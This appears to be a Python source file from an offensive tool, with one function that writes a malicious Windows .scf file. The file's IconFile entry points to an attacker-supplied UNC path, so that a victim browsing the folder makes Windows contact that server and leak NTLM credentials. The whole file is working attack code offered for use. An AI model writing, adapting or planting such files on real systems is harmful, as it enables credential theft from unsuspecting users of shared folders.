#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_scf(generate, server, filename):
    if generate == "modern":
        print("Skipping SCF as it does not work on modern Windows")
        return
    file = open(filename, "w")
    file.write(
        """[Shell]
Command=2
IconFile=\\\\"""
        + server
        + """\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop"""
    )
    file.close()
    print("Created: " + filename + " (BROWSE TO FOLDER)")
